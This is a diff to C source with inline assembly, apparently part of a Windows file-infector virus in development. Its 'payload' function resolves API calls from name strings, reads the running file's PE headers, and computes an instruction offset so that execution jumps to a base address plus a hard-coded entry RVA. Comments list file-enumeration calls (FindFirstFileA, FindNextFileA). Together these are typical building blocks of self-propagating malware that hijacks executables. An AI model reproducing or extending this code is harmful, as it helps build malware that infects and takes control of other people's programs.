@@ -47,7 +47,7 @@ void payload(void)
     char sLoadLibraryA[] = "LoadLibraryA";
     char sGetProcAddress[] = "GetProcAddress";
     char sFreeLibrary[] = "FreeLibrary";
-
+    
     // FindFirstFileA
     // FindNextFileA
     // FindClose
@@ -86,7 +86,10 @@ void payload(void)
     char msg[] = "_|Hallo|_";
     FUNCTION(puts)(msg);
 
-    // 
+    // ===========================================
+    // File 
+
+    // GetModuleFileNameW
     typedef FILE *(*t_fopen)(const char *,const char *);
     char s_fopen[] = "fopen";
     typedef size_t (*t_fread)(void *, size_t, size_t, FILE *);
@@ -101,7 +104,7 @@ void payload(void)
     
     FILE *host = FUNCTION(fopen)(host_name, mode);
 
-    // GetModuleFileNameW
+    
     // get nt_header
     IMAGE_DOS_HEADER i_dos_header = {0};
     FUNCTION(fread)(&i_dos_header, 1, sizeof(i_dos_header), host);
@@ -110,21 +113,22 @@ void payload(void)
     FUNCTION(fread)(&i_nt_headers, 1, sizeof(i_nt_headers), host);
 
     FUNCTION(fclose)(host);
+    // End file
+    // ===========================================
 
-    // &*^$*(&+*&*
-    void *offset = 0;
+    //  calculating in-file offset of instruction mov /(rva)/, %%rax
+    DWORD offset = 0;
     asm volatile(
-        // "lea key_label, %0\n\t"
-        // "sub start_label, %0\n\t"
-        "leaq payload, %%rax\n\t"
-        "leaq key_label, %%rbx\n\t"
-        "subq %%rax, %%rbx\n\t"
-        "movq %%rbx, %0\n\t"
+        "leal payload, %%eax\n\t"
+        "leal key_label, %%ebx\n\t"
+        "subl %%eax, %%ebx\n\t"
+        "movl %%ebx, %0\n\t"
         :"=r" (offset)
         :
-        :"rax", "rbx"
-    );// 0x4034AE 0x4034A3
+        :"eax", "ebx"
+    );
 
+    offset += 3;
     char format[] = "offset: %X\n"; 
     FUNCTION(printf)(format, offset);
 
@@ -138,7 +142,7 @@ void payload(void)
     asm volatile (
         // "xor %%rax, %%rax\n\t"
         "key_label: \n\t"
-        "mov $0x14E0, %%rax\n\t"
+        "mov $0x000014E0, %%rax\n\t"
         // "mov $0x1234ABCD, %%rax\n\t"
         "add %[base_addr], %%rax\n\t"
         "jmp *%%rax"
